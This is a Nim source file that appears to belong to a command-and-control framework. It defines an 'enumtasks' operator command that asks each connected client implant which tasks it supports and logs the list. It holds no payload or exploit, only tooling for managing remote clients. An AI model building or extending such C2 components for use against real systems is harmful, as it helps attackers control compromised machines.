import ../prelude

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  for client in server.cli.handlingClient:
    let task = await client.sendClientTask("enumtasks")
    if not task.isNil(): 
      await task.awaitResponse()
      if not task.isError():
        infoLog "supported tasks by " & $client & ":" 
        let p = initParser()
        p.setBuffer(cast[seq[byte]](task.output.data))

        let tasksCount = p.extractInt32()

        for _ in 1..tasksCount:
          try: infoLog p.extractString(), false
          except IndexDefect: discard

        infoLog "if a cli command is not implemented for any of the tasks, you can use the 'sendtask' command."

let cmd*: Command = Command(
  execProc: execProc,
  name: "enumtasks",
  argsLength: 0,
  usage: @["enumtasks"],
  cliMode: @[ClientInteractMode],
  description: "Enumerate the supported tasks by the client",
  category: CCClientInteraction,
  requiresConnectedClient: true
)